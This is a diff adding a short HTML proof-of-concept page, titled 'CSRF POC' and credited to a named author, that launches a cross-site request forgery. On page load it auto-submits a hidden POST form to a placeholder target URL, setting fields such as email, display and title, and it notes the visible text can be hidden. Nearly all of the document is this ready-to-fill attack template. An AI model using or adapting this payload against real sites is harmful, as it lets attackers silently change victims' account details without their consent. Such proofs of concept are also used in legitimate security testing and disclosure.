@@ -1,0 +1,19 @@
+<!--
+By Jason Tsang Mui Chung
+-->
+<html>
+This part can be invisible, its is visible only for POC purposes<br>
+<head profile="http://gmpg.org/xfn/11">
+	<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+	<meta http-equiv="content-language" content="en" />
+	<title>CSRF POC</title>
+</head>
+
+<body onload="document.createElement('form').submit.call(document.getElementById('myForm'))">
+<form id="myForm" name="myForm" action="REPLACEME_with_target_url" method="POST">
+<input type=hidden name="display" value="REPLACEME"/>
+<input type=hidden name="email" value="REPLACEME"/>
+<input type=hidden name="title" value="REPLACEME"/>
+</form>
+</body>
+</html>
